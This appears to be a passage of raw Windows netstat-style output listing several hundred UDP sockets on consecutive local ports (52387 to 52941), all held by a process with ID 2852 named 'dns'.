  UDP        0.0.0.0               52387         *:*                            2852              dns
  UDP        0.0.0.0               52388         *:*                            2852              dns
  UDP        0.0.0.0               52389         *:*                            2852              dns
  UDP        0.0.0.0               52390         *:*                            2852              dns
  UDP        0.0.0.0               52391         *:*                            2852              dns
  UDP        0.0.0.0               52392         *:*                            2852              dns
  UDP        0.0.0.0               52393         *:*                            2852              dns
  UDP        0.0.0.0               52394         *:*                            2852              dns
  UDP        0.0.0.0               52395         *:*                            2852              dns
  UDP        0.0.0.0               52396         *:*                            2852              dns
  UDP        0.0.0.0               52397         *:*                            2852              dns
  UDP        0.0.0.0               52398         *:*                            2852              dns
  UDP        0.0.0.0               52399         *:*                            2852              dns
  UDP        0.0.0.0               52400         *:*                            2852              dns
  UDP        0.0.0.0               52401         *:*                            2852              dns
  UDP        0.0.0.0               52402         *:*                            2852              dns
  UDP        0.0.0.0               52403         *:*                            2852              dns
  UDP        0.0.0.0               52404         *:*                            2852              dns
  UDP        0.0.0.0               52405         *:*                            2852              dns
  UDP        0.0.0.0               52406         *:*                            2852              dns
  UDP        0.0.0.0               52407         *:*                            2852              dns
  UDP        0.0.0.0               52408         *:*                            2852              dns
  UDP        0.0.0.0               52409         *:*                            2852              dns
  UDP        0.0.0.0               52410         *:*                            2852              dns
  UDP        0.0.0.0               52411         *:*                            2852              dns
  UDP        0.0.0.0               52412         *:*                            2852              dns
  UDP        0.0.0.0               52413         *:*                            2852              dns
  UDP        0.0.0.0               52414         *:*                            2852              dns
  UDP        0.0.0.0               52415         *:*                            2852              dns
  UDP        0.0.0.0               52416         *:*                            2852              dns
  UDP        0.0.0.0               52417         *:*                            2852              dns
  UDP        0.0.0.0               52418         *:*                            2852              dns
  UDP        0.0.0.0               52419         *:*                            2852              dns
  UDP        0.0.0.0               52420         *:*                            2852              dns
  UDP        0.0.0.0               52421         *:*                            2852              dns
  UDP        0.0.0.0               52422         *:*                            2852              dns
  UDP        0.0.0.0               52423         *:*                            2852              dns
  UDP        0.0.0.0               52424         *:*                            2852              dns
  UDP        0.0.0.0               52425         *:*                            2852              dns
  UDP        0.0.0.0               52426         *:*                            2852              dns
  UDP        0.0.0.0               52427         *:*                            2852              dns
  UDP        0.0.0.0               52428         *:*                            2852              dns
  UDP        0.0.0.0               52429         *:*                            2852              dns
  UDP        0.0.0.0               52430         *:*                            2852              dns
  UDP        0.0.0.0               52431         *:*                            2852              dns
  UDP        0.0.0.0               52432         *:*                            2852              dns
  UDP        0.0.0.0               52433         *:*                            2852              dns
  UDP        0.0.0.0               52434         *:*                            2852              dns
  UDP        0.0.0.0               52435         *:*                            2852              dns
  UDP        0.0.0.0               52436         *:*                            2852              dns
  UDP        0.0.0.0               52437         *:*                            2852              dns
  UDP        0.0.0.0               52438         *:*                            2852              dns
  UDP        0.0.0.0               52439         *:*                            2852              dns
  UDP        0.0.0.0               52440         *:*                            2852              dns
  UDP        0.0.0.0               52441         *:*                            2852              dns
  UDP        0.0.0.0               52442         *:*                            2852              dns
  UDP        0.0.0.0               52443         *:*                            2852              dns
  UDP        0.0.0.0               52444         *:*                            2852              dns
  UDP        0.0.0.0               52445         *:*                            2852              dns
  UDP        0.0.0.0               52446         *:*                            2852              dns
  UDP        0.0.0.0               52447         *:*                            2852              dns
  UDP        0.0.0.0               52448         *:*                            2852              dns
  UDP        0.0.0.0               52449         *:*                            2852              dns
  UDP        0.0.0.0               52450         *:*                            2852              dns
  UDP        0.0.0.0               52451         *:*                            2852              dns
  UDP        0.0.0.0               52452         *:*                            2852              dns
  UDP        0.0.0.0               52453         *:*                            2852              dns
  UDP        0.0.0.0               52454         *:*                            2852              dns
  UDP        0.0.0.0               52455         *:*                            2852              dns
  UDP        0.0.0.0               52456         *:*                            2852              dns
  UDP        0.0.0.0               52457         *:*                            2852              dns
  UDP        0.0.0.0               52458         *:*                            2852              dns
  UDP        0.0.0.0               52459         *:*                            2852              dns
  UDP        0.0.0.0               52460         *:*                            2852              dns
  UDP        0.0.0.0               52461         *:*                            2852              dns
  UDP        0.0.0.0               52462         *:*                            2852              dns
  UDP        0.0.0.0               52463         *:*                            2852              dns
  UDP        0.0.0.0               52464         *:*                            2852              dns
  UDP        0.0.0.0               52465         *:*                            2852              dns
  UDP        0.0.0.0               52466         *:*                            2852              dns
  UDP        0.0.0.0               52467         *:*                            2852              dns
  UDP        0.0.0.0               52468         *:*                            2852              dns
  UDP        0.0.0.0               52469         *:*                            2852              dns
  UDP        0.0.0.0               52470         *:*                            2852              dns
  UDP        0.0.0.0               52471         *:*                            2852              dns
  UDP        0.0.0.0               52472         *:*                            2852              dns
  UDP        0.0.0.0               52473         *:*                            2852              dns
  UDP        0.0.0.0               52474         *:*                            2852              dns
  UDP        0.0.0.0               52475         *:*                            2852              dns
  UDP        0.0.0.0               52476         *:*                            2852              dns
  UDP        0.0.0.0               52477         *:*                            2852              dns
  UDP        0.0.0.0               52478         *:*                            2852              dns
  UDP        0.0.0.0               52479         *:*                            2852              dns
  UDP        0.0.0.0               52480         *:*                            2852              dns
  UDP        0.0.0.0               52481         *:*                            2852              dns
  UDP        0.0.0.0               52482         *:*                            2852              dns
  UDP        0.0.0.0               52483         *:*                            2852              dns
  UDP        0.0.0.0               52484         *:*                            2852              dns
  UDP        0.0.0.0               52485         *:*                            2852              dns
  UDP        0.0.0.0               52486         *:*                            2852              dns
  UDP        0.0.0.0               52487         *:*                            2852              dns
  UDP        0.0.0.0               52488         *:*                            2852              dns
  UDP        0.0.0.0               52489         *:*                            2852              dns
  UDP        0.0.0.0               52490         *:*                            2852              dns
  UDP        0.0.0.0               52491         *:*                            2852              dns
  UDP        0.0.0.0               52492         *:*                            2852              dns
  UDP        0.0.0.0               52493         *:*                            2852              dns
  UDP        0.0.0.0               52494         *:*                            2852              dns
  UDP        0.0.0.0               52495         *:*                            2852              dns
  UDP        0.0.0.0               52496         *:*                            2852              dns
  UDP        0.0.0.0               52497         *:*                            2852              dns
  UDP        0.0.0.0               52498         *:*                            2852              dns
  UDP        0.0.0.0               52499         *:*                            2852              dns
  UDP        0.0.0.0               52500         *:*                            2852              dns
  UDP        0.0.0.0               52501         *:*                            2852              dns
  UDP        0.0.0.0               52502         *:*                            2852              dns
  UDP        0.0.0.0               52503         *:*                            2852              dns
  UDP        0.0.0.0               52504         *:*                            2852              dns
  UDP        0.0.0.0               52505         *:*                            2852              dns
  UDP        0.0.0.0               52506         *:*                            2852              dns
  UDP        0.0.0.0               52507         *:*                            2852              dns
  UDP        0.0.0.0               52508         *:*                            2852              dns
  UDP        0.0.0.0               52509         *:*                            2852              dns
  UDP        0.0.0.0               52510         *:*                            2852              dns
  UDP        0.0.0.0               52511         *:*                            2852              dns
  UDP        0.0.0.0               52512         *:*                            2852              dns
  UDP        0.0.0.0               52513         *:*                            2852              dns
  UDP        0.0.0.0               52514         *:*                            2852              dns
  UDP        0.0.0.0               52515         *:*                            2852              dns
  UDP        0.0.0.0               52516         *:*                            2852              dns
  UDP        0.0.0.0               52517         *:*                            2852              dns
  UDP        0.0.0.0               52518         *:*                            2852              dns
  UDP        0.0.0.0               52519         *:*                            2852              dns
  UDP        0.0.0.0               52520         *:*                            2852              dns
  UDP        0.0.0.0               52521         *:*                            2852              dns
  UDP        0.0.0.0               52522         *:*                            2852              dns
  UDP        0.0.0.0               52523         *:*                            2852              dns
  UDP        0.0.0.0               52524         *:*                            2852              dns
  UDP        0.0.0.0               52525         *:*                            2852              dns
  UDP        0.0.0.0               52526         *:*                            2852              dns
  UDP        0.0.0.0               52527         *:*                            2852              dns
  UDP        0.0.0.0               52528         *:*                            2852              dns
  UDP        0.0.0.0               52529         *:*                            2852              dns
  UDP        0.0.0.0               52530         *:*                            2852              dns
  UDP        0.0.0.0               52531         *:*                            2852              dns
  UDP        0.0.0.0               52532         *:*                            2852              dns
  UDP        0.0.0.0               52533         *:*                            2852              dns
  UDP        0.0.0.0               52534         *:*                            2852              dns
  UDP        0.0.0.0               52535         *:*                            2852              dns
  UDP        0.0.0.0               52536         *:*                            2852              dns
  UDP        0.0.0.0               52537         *:*                            2852              dns
  UDP        0.0.0.0               52538         *:*                            2852              dns
  UDP        0.0.0.0               52539         *:*                            2852              dns
  UDP        0.0.0.0               52540         *:*                            2852              dns
  UDP        0.0.0.0               52541         *:*                            2852              dns
  UDP        0.0.0.0               52542         *:*                            2852              dns
  UDP        0.0.0.0               52543         *:*                            2852              dns
  UDP        0.0.0.0               52544         *:*                            2852              dns
  UDP        0.0.0.0               52545         *:*                            2852              dns
  UDP        0.0.0.0               52546         *:*                            2852              dns
  UDP        0.0.0.0               52547         *:*                            2852              dns
  UDP        0.0.0.0               52548         *:*                            2852              dns
  UDP        0.0.0.0               52549         *:*                            2852              dns
  UDP        0.0.0.0               52550         *:*                            2852              dns
  UDP        0.0.0.0               52551         *:*                            2852              dns
  UDP        0.0.0.0               52552         *:*                            2852              dns
  UDP        0.0.0.0               52553         *:*                            2852              dns
  UDP        0.0.0.0               52554         *:*                            2852              dns
  UDP        0.0.0.0               52555         *:*                            2852              dns
  UDP        0.0.0.0               52556         *:*                            2852              dns
  UDP        0.0.0.0               52557         *:*                            2852              dns
  UDP        0.0.0.0               52558         *:*                            2852              dns
  UDP        0.0.0.0               52559         *:*                            2852              dns
  UDP        0.0.0.0               52560         *:*                            2852              dns
  UDP        0.0.0.0               52561         *:*                            2852              dns
  UDP        0.0.0.0               52562         *:*                            2852              dns
  UDP        0.0.0.0               52563         *:*                            2852              dns
  UDP        0.0.0.0               52564         *:*                            2852              dns
  UDP        0.0.0.0               52565         *:*                            2852              dns
  UDP        0.0.0.0               52566         *:*                            2852              dns
  UDP        0.0.0.0               52567         *:*                            2852              dns
  UDP        0.0.0.0               52568         *:*                            2852              dns
  UDP        0.0.0.0               52569         *:*                            2852              dns
  UDP        0.0.0.0               52570         *:*                            2852              dns
  UDP        0.0.0.0               52571         *:*                            2852              dns
  UDP        0.0.0.0               52572         *:*                            2852              dns
  UDP        0.0.0.0               52573         *:*                            2852              dns
  UDP        0.0.0.0               52574         *:*                            2852              dns
  UDP        0.0.0.0               52575         *:*                            2852              dns
  UDP        0.0.0.0               52576         *:*                            2852              dns
  UDP        0.0.0.0               52577         *:*                            2852              dns
  UDP        0.0.0.0               52578         *:*                            2852              dns
  UDP        0.0.0.0               52579         *:*                            2852              dns
  UDP        0.0.0.0               52580         *:*                            2852              dns
  UDP        0.0.0.0               52581         *:*                            2852              dns
  UDP        0.0.0.0               52582         *:*                            2852              dns
  UDP        0.0.0.0               52583         *:*                            2852              dns
  UDP        0.0.0.0               52584         *:*                            2852              dns
  UDP        0.0.0.0               52585         *:*                            2852              dns
  UDP        0.0.0.0               52586         *:*                            2852              dns
  UDP        0.0.0.0               52587         *:*                            2852              dns
  UDP        0.0.0.0               52588         *:*                            2852              dns
  UDP        0.0.0.0               52589         *:*                            2852              dns
  UDP        0.0.0.0               52590         *:*                            2852              dns
  UDP        0.0.0.0               52591         *:*                            2852              dns
  UDP        0.0.0.0               52592         *:*                            2852              dns
  UDP        0.0.0.0               52593         *:*                            2852              dns
  UDP        0.0.0.0               52594         *:*                            2852              dns
  UDP        0.0.0.0               52595         *:*                            2852              dns
  UDP        0.0.0.0               52596         *:*                            2852              dns
  UDP        0.0.0.0               52597         *:*                            2852              dns
  UDP        0.0.0.0               52598         *:*                            2852              dns
  UDP        0.0.0.0               52599         *:*                            2852              dns
  UDP        0.0.0.0               52600         *:*                            2852              dns
  UDP        0.0.0.0               52601         *:*                            2852              dns
  UDP        0.0.0.0               52602         *:*                            2852              dns
  UDP        0.0.0.0               52603         *:*                            2852              dns
  UDP        0.0.0.0               52604         *:*                            2852              dns
  UDP        0.0.0.0               52605         *:*                            2852              dns
  UDP        0.0.0.0               52606         *:*                            2852              dns
  UDP        0.0.0.0               52607         *:*                            2852              dns
  UDP        0.0.0.0               52608         *:*                            2852              dns
  UDP        0.0.0.0               52609         *:*                            2852              dns
  UDP        0.0.0.0               52610         *:*                            2852              dns
  UDP        0.0.0.0               52611         *:*                            2852              dns
  UDP        0.0.0.0               52612         *:*                            2852              dns
  UDP        0.0.0.0               52613         *:*                            2852              dns
  UDP        0.0.0.0               52614         *:*                            2852              dns
  UDP        0.0.0.0               52615         *:*                            2852              dns
  UDP        0.0.0.0               52616         *:*                            2852              dns
  UDP        0.0.0.0               52617         *:*                            2852              dns
  UDP        0.0.0.0               52618         *:*                            2852              dns
  UDP        0.0.0.0               52619         *:*                            2852              dns
  UDP        0.0.0.0               52620         *:*                            2852              dns
  UDP        0.0.0.0               52621         *:*                            2852              dns
  UDP        0.0.0.0               52622         *:*                            2852              dns
  UDP        0.0.0.0               52623         *:*                            2852              dns
  UDP        0.0.0.0               52624         *:*                            2852              dns
  UDP        0.0.0.0               52625         *:*                            2852              dns
  UDP        0.0.0.0               52626         *:*                            2852              dns
  UDP        0.0.0.0               52627         *:*                            2852              dns
  UDP        0.0.0.0               52628         *:*                            2852              dns
  UDP        0.0.0.0               52629         *:*                            2852              dns
  UDP        0.0.0.0               52630         *:*                            2852              dns
  UDP        0.0.0.0               52631         *:*                            2852              dns
  UDP        0.0.0.0               52632         *:*                            2852              dns
  UDP        0.0.0.0               52633         *:*                            2852              dns
  UDP        0.0.0.0               52634         *:*                            2852              dns
  UDP        0.0.0.0               52635         *:*                            2852              dns
  UDP        0.0.0.0               52636         *:*                            2852              dns
  UDP        0.0.0.0               52637         *:*                            2852              dns
  UDP        0.0.0.0               52638         *:*                            2852              dns
  UDP        0.0.0.0               52639         *:*                            2852              dns
  UDP        0.0.0.0               52640         *:*                            2852              dns
  UDP        0.0.0.0               52641         *:*                            2852              dns
  UDP        0.0.0.0               52642         *:*                            2852              dns
  UDP        0.0.0.0               52643         *:*                            2852              dns
  UDP        0.0.0.0               52644         *:*                            2852              dns
  UDP        0.0.0.0               52645         *:*                            2852              dns
  UDP        0.0.0.0               52646         *:*                            2852              dns
  UDP        0.0.0.0               52647         *:*                            2852              dns
  UDP        0.0.0.0               52648         *:*                            2852              dns
  UDP        0.0.0.0               52649         *:*                            2852              dns
  UDP        0.0.0.0               52650         *:*                            2852              dns
  UDP        0.0.0.0               52651         *:*                            2852              dns
  UDP        0.0.0.0               52652         *:*                            2852              dns
  UDP        0.0.0.0               52653         *:*                            2852              dns
  UDP        0.0.0.0               52654         *:*                            2852              dns
  UDP        0.0.0.0               52655         *:*                            2852              dns
  UDP        0.0.0.0               52656         *:*                            2852              dns
  UDP        0.0.0.0               52657         *:*                            2852              dns
  UDP        0.0.0.0               52658         *:*                            2852              dns
  UDP        0.0.0.0               52659         *:*                            2852              dns
  UDP        0.0.0.0               52660         *:*                            2852              dns
  UDP        0.0.0.0               52661         *:*                            2852              dns
  UDP        0.0.0.0               52662         *:*                            2852              dns
  UDP        0.0.0.0               52663         *:*                            2852              dns
  UDP        0.0.0.0               52664         *:*                            2852              dns
  UDP        0.0.0.0               52665         *:*                            2852              dns
  UDP        0.0.0.0               52666         *:*                            2852              dns
  UDP        0.0.0.0               52667         *:*                            2852              dns
  UDP        0.0.0.0               52668         *:*                            2852              dns
  UDP        0.0.0.0               52669         *:*                            2852              dns
  UDP        0.0.0.0               52670         *:*                            2852              dns
  UDP        0.0.0.0               52671         *:*                            2852              dns
  UDP        0.0.0.0               52672         *:*                            2852              dns
  UDP        0.0.0.0               52673         *:*                            2852              dns
  UDP        0.0.0.0               52674         *:*                            2852              dns
  UDP        0.0.0.0               52675         *:*                            2852              dns
  UDP        0.0.0.0               52676         *:*                            2852              dns
  UDP        0.0.0.0               52677         *:*                            2852              dns
  UDP        0.0.0.0               52678         *:*                            2852              dns
  UDP        0.0.0.0               52679         *:*                            2852              dns
  UDP        0.0.0.0               52680         *:*                            2852              dns
  UDP        0.0.0.0               52681         *:*                            2852              dns
  UDP        0.0.0.0               52682         *:*                            2852              dns
  UDP        0.0.0.0               52683         *:*                            2852              dns
  UDP        0.0.0.0               52684         *:*                            2852              dns
  UDP        0.0.0.0               52685         *:*                            2852              dns
  UDP        0.0.0.0               52686         *:*                            2852              dns
  UDP        0.0.0.0               52687         *:*                            2852              dns
  UDP        0.0.0.0               52688         *:*                            2852              dns
  UDP        0.0.0.0               52689         *:*                            2852              dns
  UDP        0.0.0.0               52690         *:*                            2852              dns
  UDP        0.0.0.0               52691         *:*                            2852              dns
  UDP        0.0.0.0               52692         *:*                            2852              dns
  UDP        0.0.0.0               52693         *:*                            2852              dns
  UDP        0.0.0.0               52694         *:*                            2852              dns
  UDP        0.0.0.0               52695         *:*                            2852              dns
  UDP        0.0.0.0               52696         *:*                            2852              dns
  UDP        0.0.0.0               52697         *:*                            2852              dns
  UDP        0.0.0.0               52698         *:*                            2852              dns
  UDP        0.0.0.0               52699         *:*                            2852              dns
  UDP        0.0.0.0               52700         *:*                            2852              dns
  UDP        0.0.0.0               52701         *:*                            2852              dns
  UDP        0.0.0.0               52702         *:*                            2852              dns
  UDP        0.0.0.0               52703         *:*                            2852              dns
  UDP        0.0.0.0               52704         *:*                            2852              dns
  UDP        0.0.0.0               52705         *:*                            2852              dns
  UDP        0.0.0.0               52706         *:*                            2852              dns
  UDP        0.0.0.0               52707         *:*                            2852              dns
  UDP        0.0.0.0               52708         *:*                            2852              dns
  UDP        0.0.0.0               52709         *:*                            2852              dns
  UDP        0.0.0.0               52710         *:*                            2852              dns
  UDP        0.0.0.0               52711         *:*                            2852              dns
  UDP        0.0.0.0               52712         *:*                            2852              dns
  UDP        0.0.0.0               52713         *:*                            2852              dns
  UDP        0.0.0.0               52714         *:*                            2852              dns
  UDP        0.0.0.0               52715         *:*                            2852              dns
  UDP        0.0.0.0               52716         *:*                            2852              dns
  UDP        0.0.0.0               52717         *:*                            2852              dns
  UDP        0.0.0.0               52718         *:*                            2852              dns
  UDP        0.0.0.0               52719         *:*                            2852              dns
  UDP        0.0.0.0               52720         *:*                            2852              dns
  UDP        0.0.0.0               52721         *:*                            2852              dns
  UDP        0.0.0.0               52722         *:*                            2852              dns
  UDP        0.0.0.0               52723         *:*                            2852              dns
  UDP        0.0.0.0               52724         *:*                            2852              dns
  UDP        0.0.0.0               52725         *:*                            2852              dns
  UDP        0.0.0.0               52726         *:*                            2852              dns
  UDP        0.0.0.0               52727         *:*                            2852              dns
  UDP        0.0.0.0               52728         *:*                            2852              dns
  UDP        0.0.0.0               52729         *:*                            2852              dns
  UDP        0.0.0.0               52730         *:*                            2852              dns
  UDP        0.0.0.0               52731         *:*                            2852              dns
  UDP        0.0.0.0               52732         *:*                            2852              dns
  UDP        0.0.0.0               52733         *:*                            2852              dns
  UDP        0.0.0.0               52734         *:*                            2852              dns
  UDP        0.0.0.0               52735         *:*                            2852              dns
  UDP        0.0.0.0               52736         *:*                            2852              dns
  UDP        0.0.0.0               52737         *:*                            2852              dns
  UDP        0.0.0.0               52738         *:*                            2852              dns
  UDP        0.0.0.0               52739         *:*                            2852              dns
  UDP        0.0.0.0               52740         *:*                            2852              dns
  UDP        0.0.0.0               52741         *:*                            2852              dns
  UDP        0.0.0.0               52742         *:*                            2852              dns
  UDP        0.0.0.0               52743         *:*                            2852              dns
  UDP        0.0.0.0               52744         *:*                            2852              dns
  UDP        0.0.0.0               52745         *:*                            2852              dns
  UDP        0.0.0.0               52746         *:*                            2852              dns
  UDP        0.0.0.0               52747         *:*                            2852              dns
  UDP        0.0.0.0               52748         *:*                            2852              dns
  UDP        0.0.0.0               52749         *:*                            2852              dns
  UDP        0.0.0.0               52750         *:*                            2852              dns
  UDP        0.0.0.0               52751         *:*                            2852              dns
  UDP        0.0.0.0               52752         *:*                            2852              dns
  UDP        0.0.0.0               52753         *:*                            2852              dns
  UDP        0.0.0.0               52754         *:*                            2852              dns
  UDP        0.0.0.0               52755         *:*                            2852              dns
  UDP        0.0.0.0               52756         *:*                            2852              dns
  UDP        0.0.0.0               52757         *:*                            2852              dns
  UDP        0.0.0.0               52758         *:*                            2852              dns
  UDP        0.0.0.0               52759         *:*                            2852              dns
  UDP        0.0.0.0               52760         *:*                            2852              dns
  UDP        0.0.0.0               52761         *:*                            2852              dns
  UDP        0.0.0.0               52762         *:*                            2852              dns
  UDP        0.0.0.0               52763         *:*                            2852              dns
  UDP        0.0.0.0               52764         *:*                            2852              dns
  UDP        0.0.0.0               52765         *:*                            2852              dns
  UDP        0.0.0.0               52766         *:*                            2852              dns
  UDP        0.0.0.0               52767         *:*                            2852              dns
  UDP        0.0.0.0               52768         *:*                            2852              dns
  UDP        0.0.0.0               52769         *:*                            2852              dns
  UDP        0.0.0.0               52770         *:*                            2852              dns
  UDP        0.0.0.0               52771         *:*                            2852              dns
  UDP        0.0.0.0               52772         *:*                            2852              dns
  UDP        0.0.0.0               52773         *:*                            2852              dns
  UDP        0.0.0.0               52774         *:*                            2852              dns
  UDP        0.0.0.0               52775         *:*                            2852              dns
  UDP        0.0.0.0               52776         *:*                            2852              dns
  UDP        0.0.0.0               52777         *:*                            2852              dns
  UDP        0.0.0.0               52778         *:*                            2852              dns
  UDP        0.0.0.0               52779         *:*                            2852              dns
  UDP        0.0.0.0               52780         *:*                            2852              dns
  UDP        0.0.0.0               52781         *:*                            2852              dns
  UDP        0.0.0.0               52782         *:*                            2852              dns
  UDP        0.0.0.0               52783         *:*                            2852              dns
  UDP        0.0.0.0               52784         *:*                            2852              dns
  UDP        0.0.0.0               52785         *:*                            2852              dns
  UDP        0.0.0.0               52786         *:*                            2852              dns
  UDP        0.0.0.0               52787         *:*                            2852              dns
  UDP        0.0.0.0               52788         *:*                            2852              dns
  UDP        0.0.0.0               52789         *:*                            2852              dns
  UDP        0.0.0.0               52790         *:*                            2852              dns
  UDP        0.0.0.0               52791         *:*                            2852              dns
  UDP        0.0.0.0               52792         *:*                            2852              dns
  UDP        0.0.0.0               52793         *:*                            2852              dns
  UDP        0.0.0.0               52794         *:*                            2852              dns
  UDP        0.0.0.0               52795         *:*                            2852              dns
  UDP        0.0.0.0               52796         *:*                            2852              dns
  UDP        0.0.0.0               52797         *:*                            2852              dns
  UDP        0.0.0.0               52798         *:*                            2852              dns
  UDP        0.0.0.0               52799         *:*                            2852              dns
  UDP        0.0.0.0               52800         *:*                            2852              dns
  UDP        0.0.0.0               52801         *:*                            2852              dns
  UDP        0.0.0.0               52802         *:*                            2852              dns
  UDP        0.0.0.0               52803         *:*                            2852              dns
  UDP        0.0.0.0               52804         *:*                            2852              dns
  UDP        0.0.0.0               52805         *:*                            2852              dns
  UDP        0.0.0.0               52806         *:*                            2852              dns
  UDP        0.0.0.0               52807         *:*                            2852              dns
  UDP        0.0.0.0               52808         *:*                            2852              dns
  UDP        0.0.0.0               52809         *:*                            2852              dns
  UDP        0.0.0.0               52810         *:*                            2852              dns
  UDP        0.0.0.0               52811         *:*                            2852              dns
  UDP        0.0.0.0               52812         *:*                            2852              dns
  UDP        0.0.0.0               52813         *:*                            2852              dns
  UDP        0.0.0.0               52814         *:*                            2852              dns
  UDP        0.0.0.0               52815         *:*                            2852              dns
  UDP        0.0.0.0               52816         *:*                            2852              dns
  UDP        0.0.0.0               52817         *:*                            2852              dns
  UDP        0.0.0.0               52818         *:*                            2852              dns
  UDP        0.0.0.0               52819         *:*                            2852              dns
  UDP        0.0.0.0               52820         *:*                            2852              dns
  UDP        0.0.0.0               52821         *:*                            2852              dns
  UDP        0.0.0.0               52822         *:*                            2852              dns
  UDP        0.0.0.0               52823         *:*                            2852              dns
  UDP        0.0.0.0               52824         *:*                            2852              dns
  UDP        0.0.0.0               52825         *:*                            2852              dns
  UDP        0.0.0.0               52826         *:*                            2852              dns
  UDP        0.0.0.0               52827         *:*                            2852              dns
  UDP        0.0.0.0               52828         *:*                            2852              dns
  UDP        0.0.0.0               52829         *:*                            2852              dns
  UDP        0.0.0.0               52830         *:*                            2852              dns
  UDP        0.0.0.0               52831         *:*                            2852              dns
  UDP        0.0.0.0               52832         *:*                            2852              dns
  UDP        0.0.0.0               52833         *:*                            2852              dns
  UDP        0.0.0.0               52834         *:*                            2852              dns
  UDP        0.0.0.0               52835         *:*                            2852              dns
  UDP        0.0.0.0               52836         *:*                            2852              dns
  UDP        0.0.0.0               52837         *:*                            2852              dns
  UDP        0.0.0.0               52838         *:*                            2852              dns
  UDP        0.0.0.0               52839         *:*                            2852              dns
  UDP        0.0.0.0               52840         *:*                            2852              dns
  UDP        0.0.0.0               52841         *:*                            2852              dns
  UDP        0.0.0.0               52842         *:*                            2852              dns
  UDP        0.0.0.0               52843         *:*                            2852              dns
  UDP        0.0.0.0               52844         *:*                            2852              dns
  UDP        0.0.0.0               52845         *:*                            2852              dns
  UDP        0.0.0.0               52846         *:*                            2852              dns
  UDP        0.0.0.0               52847         *:*                            2852              dns
  UDP        0.0.0.0               52848         *:*                            2852              dns
  UDP        0.0.0.0               52849         *:*                            2852              dns
  UDP        0.0.0.0               52850         *:*                            2852              dns
  UDP        0.0.0.0               52851         *:*                            2852              dns
  UDP        0.0.0.0               52852         *:*                            2852              dns
  UDP        0.0.0.0               52853         *:*                            2852              dns
  UDP        0.0.0.0               52854         *:*                            2852              dns
  UDP        0.0.0.0               52855         *:*                            2852              dns
  UDP        0.0.0.0               52856         *:*                            2852              dns
  UDP        0.0.0.0               52857         *:*                            2852              dns
  UDP        0.0.0.0               52858         *:*                            2852              dns
  UDP        0.0.0.0               52859         *:*                            2852              dns
  UDP        0.0.0.0               52860         *:*                            2852              dns
  UDP        0.0.0.0               52861         *:*                            2852              dns
  UDP        0.0.0.0               52862         *:*                            2852              dns
  UDP        0.0.0.0               52863         *:*                            2852              dns
  UDP        0.0.0.0               52864         *:*                            2852              dns
  UDP        0.0.0.0               52865         *:*                            2852              dns
  UDP        0.0.0.0               52866         *:*                            2852              dns
  UDP        0.0.0.0               52867         *:*                            2852              dns
  UDP        0.0.0.0               52868         *:*                            2852              dns
  UDP        0.0.0.0               52869         *:*                            2852              dns
  UDP        0.0.0.0               52870         *:*                            2852              dns
  UDP        0.0.0.0               52871         *:*                            2852              dns
  UDP        0.0.0.0               52872         *:*                            2852              dns
  UDP        0.0.0.0               52873         *:*                            2852              dns
  UDP        0.0.0.0               52874         *:*                            2852              dns
  UDP        0.0.0.0               52875         *:*                            2852              dns
  UDP        0.0.0.0               52876         *:*                            2852              dns
  UDP        0.0.0.0               52877         *:*                            2852              dns
  UDP        0.0.0.0               52878         *:*                            2852              dns
  UDP        0.0.0.0               52879         *:*                            2852              dns
  UDP        0.0.0.0               52880         *:*                            2852              dns
  UDP        0.0.0.0               52881         *:*                            2852              dns
  UDP        0.0.0.0               52882         *:*                            2852              dns
  UDP        0.0.0.0               52883         *:*                            2852              dns
  UDP        0.0.0.0               52884         *:*                            2852              dns
  UDP        0.0.0.0               52885         *:*                            2852              dns
  UDP        0.0.0.0               52886         *:*                            2852              dns
  UDP        0.0.0.0               52887         *:*                            2852              dns
  UDP        0.0.0.0               52888         *:*                            2852              dns
  UDP        0.0.0.0               52889         *:*                            2852              dns
  UDP        0.0.0.0               52890         *:*                            2852              dns
  UDP        0.0.0.0               52891         *:*                            2852              dns
  UDP        0.0.0.0               52892         *:*                            2852              dns
  UDP        0.0.0.0               52893         *:*                            2852              dns
  UDP        0.0.0.0               52894         *:*                            2852              dns
  UDP        0.0.0.0               52895         *:*                            2852              dns
  UDP        0.0.0.0               52896         *:*                            2852              dns
  UDP        0.0.0.0               52897         *:*                            2852              dns
  UDP        0.0.0.0               52898         *:*                            2852              dns
  UDP        0.0.0.0               52899         *:*                            2852              dns
  UDP        0.0.0.0               52900         *:*                            2852              dns
  UDP        0.0.0.0               52901         *:*                            2852              dns
  UDP        0.0.0.0               52902         *:*                            2852              dns
  UDP        0.0.0.0               52903         *:*                            2852              dns
  UDP        0.0.0.0               52904         *:*                            2852              dns
  UDP        0.0.0.0               52905         *:*                            2852              dns
  UDP        0.0.0.0               52906         *:*                            2852              dns
  UDP        0.0.0.0               52907         *:*                            2852              dns
  UDP        0.0.0.0               52908         *:*                            2852              dns
  UDP        0.0.0.0               52909         *:*                            2852              dns
  UDP        0.0.0.0               52910         *:*                            2852              dns
  UDP        0.0.0.0               52911         *:*                            2852              dns
  UDP        0.0.0.0               52912         *:*                            2852              dns
  UDP        0.0.0.0               52913         *:*                            2852              dns
  UDP        0.0.0.0               52914         *:*                            2852              dns
  UDP        0.0.0.0               52915         *:*                            2852              dns
  UDP        0.0.0.0               52916         *:*                            2852              dns
  UDP        0.0.0.0               52917         *:*                            2852              dns
  UDP        0.0.0.0               52918         *:*                            2852              dns
  UDP        0.0.0.0               52919         *:*                            2852              dns
  UDP        0.0.0.0               52920         *:*                            2852              dns
  UDP        0.0.0.0               52921         *:*                            2852              dns
  UDP        0.0.0.0               52922         *:*                            2852              dns
  UDP        0.0.0.0               52923         *:*                            2852              dns
  UDP        0.0.0.0               52924         *:*                            2852              dns
  UDP        0.0.0.0               52925         *:*                            2852              dns
  UDP        0.0.0.0               52926         *:*                            2852              dns
  UDP        0.0.0.0               52927         *:*                            2852              dns
  UDP        0.0.0.0               52928         *:*                            2852              dns
  UDP        0.0.0.0               52929         *:*                            2852              dns
  UDP        0.0.0.0               52930         *:*                            2852              dns
  UDP        0.0.0.0               52931         *:*                            2852              dns
  UDP        0.0.0.0               52932         *:*                            2852              dns
  UDP        0.0.0.0               52933         *:*                            2852              dns
  UDP        0.0.0.0               52934         *:*                            2852              dns
  UDP        0.0.0.0               52935         *:*                            2852              dns
  UDP        0.0.0.0               52936         *:*                            2852              dns
  UDP        0.0.0.0               52937         *:*                            2852              dns
  UDP        0.0.0.0               52938         *:*                            2852              dns
  UDP        0.0.0.0               52939         *:*                            2852              dns
  UDP        0.0.0.0               52940         *:*                            2852              dns
  UDP        0.0.0.0               52941         *:*                            2852              dns
